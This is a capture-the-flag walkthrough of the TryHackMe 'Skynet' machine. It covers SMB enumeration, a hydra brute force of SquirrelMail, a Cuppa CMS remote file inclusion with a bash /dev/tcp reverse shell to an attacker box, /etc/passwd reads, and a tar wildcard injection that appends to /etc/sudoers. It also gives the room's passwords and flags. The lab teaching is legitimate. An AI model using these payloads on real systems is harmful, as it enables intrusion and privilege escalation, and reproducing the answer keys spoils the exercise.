# Skynet

## Quick nmap scan:

Just to determine ports and check if pop3 or imap secure ports open
```
$ nmap -sS THM_Target 
...
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds

$ nmap -sS THM_Target -p 25,993,995,465
PORT    STATE  SERVICE
25/tcp  closed smtps
465/tcp closed smtps
993/tcp closed imaps
995/tcp closed pop3s
```

This is important later as hydra will fail if used to access port 110 as it diverts traffic to SSL port likely 993, as squirrelmail uses imap not pop3. Test with netcat on port 110 failed as shows SSL required for authentication.

```
$ nc THM_Target 110
+OK Dovecot ready.
USER milesdyson
-ERR [AUTH] Plaintext authentication disallowed on non-secure (SSL/TLS) connections.
```

More about the services:
```
# nmap -Pn -sV -sC THM_Target
...
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: TOP UIDL SASL CAPA RESP-CODES AUTH-RESP-CODE PIPELINING
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: ID LITERAL+ more OK have IMAP4rev1 ENABLE LOGINDISABLEDA0001 capabilities post-login IDLE listed SASL-IR Pre-login LOGIN-REFERRALS
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2026-04-29T13:41:24-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-04-29T18:41:24
|_  start_date: N/A
```

- Dovecot is configured to disallow USER/PASS authentication on POP3, should include USER and PASS for it to work.
- IMAP also disabled as shown by _imap-capabilities: ... LOGINDISABLEDA0001 ...
- Hydra and netcat will fail as both disabled.
- SquirrelMail however connects as its locally installed on localhost:443, but does not allow external imap connection.
- Shortlist of SMB shares available. Does provide a useful name milesdyson and anonymous for shares.

```
# smbclient -L //THM_Target
Password for [WORKGROUP\root]:
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))

Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------
        Workgroup            Master
        ---------            -------
        WORKGROUP            SKYNET
```

Find out more about smb by running nmap scripts to enumerate users, shares, and OS discovery. Note this showed the same and more information than 'enum4linux -U THM_Target' did.

```
# nmap -p 139,445 --script smb-enum-shares,smb-enum-users,smb-os-discovery THM_Target
...
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\THM_Target\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (skynet server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\THM_Target\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: Skynet Anonymous Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\srv\samba
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\THM_Target\milesdyson: 
|     Type: STYPE_DISKTREE
|     Comment: Miles Dyson Personal Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\milesdyson\share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\THM_Target\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
|_smb-enum-users: ERROR: Script execution failed (use -d to debug)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2026-04-29T13:42:56-05:00
```

They the anonymous user milesdyson required a password
```
# smbclient \\\\THM_Target\\anonymous
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 16:04:00 2020
  ..                                  D        0  Tue Sep 17 08:20:17 2019
  attention.txt                       N      163  Wed Sep 18 04:04:59 2019
  logs                                D        0  Wed Sep 18 05:42:16 2019
...

smb: \logs\> ls
  .                                   D        0  Wed Sep 18 05:42:16 2019
  ..                                  D        0  Thu Nov 26 16:04:00 2020
  log2.txt                            N        0  Wed Sep 18 05:42:13 2019
  log1.txt                            N      471  Wed Sep 18 05:41:59 2019
  log3.txt                            N        0  Wed Sep 18 05:42:16 2019
```

Log2 and log3 files clearly empty. Log1 text file appears to show 31 rows, 
```
# cat log1.txt 
cyborg007haloterminator
terminator22596
terminator219
terminator20
...
```

Attention file gives us the name of Miles Dyson.
```
# cat attention.txt 
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

## Q1 What is Miles password for his emails?
External pop3 and IMAP will fail but after gobuster search squirrelmail was discovered. This runs locally supporting IMAP. 

Gobuster to search directories:
```
$ gobuster dir -u "THM_Target" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64     
...
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 308] [--> http://thm_target/admin/]                                          
/css                  (Status: 301) [Size: 306] [--> http://thm_target/css/]                                            
/js                   (Status: 301) [Size: 305] [--> http://thm_target/js/]                                             
/config               (Status: 301) [Size: 309] [--> http://thm_target/config/]                                         
/ai                   (Status: 301) [Size: 305] [--> http://thm_target/ai/]                                             
/squirrelmail         (Status: 301) [Size: 315] [--> http://thm_target/squirrelmail/]                                   
/server-status        (Status: 403) [Size: 275]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
```

Squirrelmail seemed worth a look so tried in the browswer and there was a login screen for squirrel mail. The version on the page was 1.4.23. Through exploit-db there was one RCE exploit present that suited SquirrelMail <= 1.4.23 Remote Code Execution PoC Exploit (CVE-2017-7692). The catch was a password and username was required to access it. The RCE was tried and failed likely limitations of the target in this case.

- Burpesuite seemed like next best option.
	- I simply used  THM_Target_IP/squirrelmail to access login page
 	- Started burpesuite then initiated foxy proxy
  	- used milesdyson as the username as its likely same name for email account
  	- Then just one sniper attack on the one variable
  	- The password was found in the list. Its listed twice.
 
Answer Q1: cyborg007haloterminator

Alternatively hydra did work, perfect one with only short list log1.txt:

Since the login page sends a POST request for login, from looking at source code:
```
...
<form action="redirect.php" method="post" name="login_form"  >
...
```
User name field variable : login_username
Password field variable : secretkey
Failed attempt sign found in title '<title>SquirrelMail - Unknown user or password incorrect.</title>'
http-post-form format : <path>:<POST data>:<failure string>

# hydra -l milesdyson -P log1.txt THM_Target http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect"
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-10 07:52:52
[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:1/p:4), ~1 try per task
[DATA] attacking http-post-form://THM_Target:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect
[80][http-post-form] host: THM_Target   login: milesdyson   password: cyborg007haloterminator
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-10 07:52:57


## Q2 What is the hidden directory?

SquirrelMail and this password discovery leads us to SMB password.
- The first email gives us the SMB password: )s{A&2Z=F^n_E.B`
- The other emails hold nothing of interest.

There is two methods to use the password first easiest is to use as oneliner:
using the form: smbclient //host/share -U user%password
Help menu using --password= fails with or without quotes
```
smbclient //THM_Target/milesdyson -U "milesdyson%)s{A&2Z=F^n_E.B`"
```

Or SMBclient can use an authfile but requires a specific format to work 
```
username = milesdyson
password = )s{A&2Z=F^n_E.B`
domain   =
```

Then save to simple name like Auth.txt
Then use:
```
smbclient \\\\<targetIP>\\milesdyson -A Auth.txt
```

There is 1 folder and many files, in folder notes is one file among many called important.txt
containing:

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife

Answer Q2: /45kra24zxs28v3yd is the hidden directory


## Q3 What is the vulnerability called when you can include a remote file for malicious purposes?

AnswerQ3: Remote File Inclusion

This is literally a clue for the next step, gobuster search into directory finds a directory called /administrator. A quick search with browser shows THM_Target/administrator/ presents us with the Cuppa CMS login page, based on text above login section "Use a valid username and password to gain access to the administrator". Clearly meant to be an administrative access point. 

## Q4 What is the user flag?

Now to exploit the Cuppa CMS page which easiest option is via searchsploit, which presents same information on exploit as exploit-db.com

searchsploit gives us:
```
$ searchsploit cuppa                
...
 Exploit Title                                                  |  Path
------------------------------------------------------------------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion | php/webapps/25971.txt
------------------------------------------------------------------------------------------

$ cat /usr/share/exploitdb/exploits/php/webapps/25971.txt
# Exploit Title   : Cuppa CMS File Inclusion
...
# Tested on       : Window and Linux
...
####################################
VULNERABILITY: PHP CODE INJECTION
####################################
/alerts/alertConfigField.php (LINE: 22)
-----------------------------------------------------------------------------
LINE 22:   <?php include($_REQUEST["urlConfig"]); ?>
-----------------------------------------------------------------------------
#####################################################
DESCRIPTION
#####################################################

An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.

http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]

#####################################################
EXPLOIT
#####################################################

http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

Moreover, We could access Configuration.php source code via PHPStream

For Example:
-----------------------------------------------------------------------------
http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
-----------------------------------------------------------------------------
...
```
The path listed target/cuppa/alerts/... I checked gobuster or dictionary and then added cuppa. There is no cuppa name in the directory structure but alerts is present in administrator directory. 
```
$ gobuster dir -u "http://thm_target/45kra24zxs28v3yd/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64
...
Starting gobuster in directory enumeration mode
===============================================================
/administrator        (Status: 301) [Size: 333] [-->... ===============================================================

#here cuppa added to word list with no benefit
$ gobuster dir -u "http://thm_target/45kra24zxs28v3yd/administrator/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64
...
Starting gobuster in directory enumeration mode
===============================================================
/media                (Status: 301) [Size: 339] [-->...
/templates            (Status: 301) [Size: 343] [-->...
/alerts               (Status: 301) [Size: 340] [-->...
/js                   (Status: 301) [Size: 336] [-->...
/components           (Status: 301) [Size: 344] [-->...
/classes              (Status: 301) [Size: 341] [-->...
```

So exploit is modifeid given what was present.
```
http://THM_Target/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

This successfully downloads the full passwd file, changing passwd to shadows blank page indicating not at root user access privilege.

For remote file inclusion we can upload a reverse shell, using a PHP file. for a PHP file to be executable and to run a bash script inside:
```
<?php
exec("/bin/bash -c 'command1; command2; command3'");
?>
```

Using a simple reverse shell:
```
<?php exec ("/bin/bash -c 'bash -i >& /dev/tcp/<AttackBoxIP>/443 0>&1'");?>
```

Then uploading using a simple python http server and calling the script by changing urlconfig line:
```
urlConfig=http://<AttackBoxIP>:443/shell.php
```

A reverse shell is connected and flag is obtained:
```
www-data@skynet:/var/www/html/45kra24zxs28v3yd/administrator/alerts$ cd /home/milesdyson
www-data@skynet:/home/milesdyson$ ls
backups
mail
share
user.txt
www-data@skynet:/home/milesdyson$ cat user.txt
7ce5c2109a40f958099283600a9ae807
www-data@skynet:/home/milesdyson$
```

Answer for Q4: 7ce5c2109a40f958099283600a9ae807
And note access here is with permissions of www-data, common for a online resource.

## Q5 What is the root flag?

Next escalation required to access the root directory.
To upgrade the reverse shell in place the SKYNET server hear cannot handle much more than
```
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

I tried this after I tried this method which failed horribly resulting in disconnection of netcat in background.
```
python -c 'import pty; pty.spawn("/bin/sh")'
Ctrl+Z
stty raw -echo
fg
```
Looking at files accessible to Miles Dyson only contents of share, backups folders and user.txt are accessible due to permissions set from the current user www-data access.
```
$ ls -la 
ls -la 
total 36
drwxr-xr-x 5 milesdyson milesdyson 4096 Sep 17  2019 .
drwxr-xr-x 3 root       root       4096 Sep 17  2019 ..
lrwxrwxrwx 1 root       root          9 Sep 17  2019 .bash_history -> /dev/null
-rw-r--r-- 1 milesdyson milesdyson  220 Sep 17  2019 .bash_logout
-rw-r--r-- 1 milesdyson milesdyson 3771 Sep 17  2019 .bashrc
-rw-r--r-- 1 milesdyson milesdyson  655 Sep 17  2019 .profile
drwxr-xr-x 2 root       root       4096 Sep 17  2019 backups
drwx------ 3 milesdyson milesdyson 4096 Sep 17  2019 mail
drwxr-xr-x 3 milesdyson milesdyson 4096 Sep 17  2019 share
-rw-r--r-- 1 milesdyson milesdyson   33 Sep 17  2019 user.txt
$ pwd
/home/milesdyson
$ cd mail
/bin/sh: 14: cd: can't cd to mail
$ cd backup
/bin/sh: 15: cd: can't cd to backup
$ cd backups
$ ls
backup.sh  backup.tgz
```
backup.sh is likely to be called by something and backup.tgz is only file updated regularly based on ls -la results, linked to backup.sh file its likely in crontabs.
```
www-data@skynet:/home/milesdyson/backups$ ls
backup.sh
backup.tgz

$ cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *

$ ls -la 
total 4584
drwxr-xr-x 2 root       root          4096 Sep 17  2019 .
drwxr-xr-x 5 milesdyson milesdyson    4096 Sep 17  2019 ..
-rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh
-rw-r--r-- 1 root       root       4679680 May  3 11:08 backup.tgz
```
Sure enough backup.sh is in crontab file and run every minute with root permissions.
This script performs backup for contents of /var/www/html the folder usually associated with files presented in web browser
```
www-data@skynet:/home/milesdyson/backups$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
...
```
TAR is likely process that should be one that can be manipulated: 
- Runs here with root privilege.
- It uses wild card to for all files in /var/www/html
- /var/www/html is writeable by the web server user www-data 
I did try suid search:
$ find / -type f -perm -u=s 2>/dev/null
but nothing really obvious to me stood out of list.
```
<dyson/backups$ find / -type f -perm -u=s 2>/dev/nul                         
/sbin/mount.cifs
/bin/mount
/bin/fusermount
/bin/umount
/bin/ping
/bin/su
/bin/ping6
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/at
/usr/bin/newuidmap
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
www-data@skynet:/home/milesdyson/backups$
```
From memory I think /usr/bin/at might have potential but I will focus on the TAR command.
GTOBINS did not offer anything I could see would work here but knowing it reads any files in /var/www/html is likely the key this one was beyond me. But the idea was to use names starting with - aparently TAR interprets these as options the idea is TAR runs with root command and has ability to change the /etc/sudoers content. What is done is a create a simple script to run in the /var/www/html folder to add permissions to www-data to be able to use root access with no password. Then utilize touch to create 2 files to create files which start with - to be mishandled as options first then a file.
```

$ echo 'echo "www-data ALL=(root) NOPASSWD: ALL">>/etc/sudoers'>sudo.sh
$ touch "/var/www/html/ - checkpoint-action=exec=sh sudo.sh"
$ touch "/var/www/html/ - checkpoint=1"
www-data@skynet:/var/www/html$ ls
 - checkpoint-action=exec-sh sudo.sh
 - checkpoint=1
45kra24zxs28v3yd
...
sudo.sh

$ cat sudo.sh
cat sudo.sh
echo "www-data ALL=(root) NOPASSWD: ALL">>/etc/sudoers

$ sudo su
$ cat /root/root.txt
```
ANSWER Q5: 3f0372db24753accc7179a282cd6a949
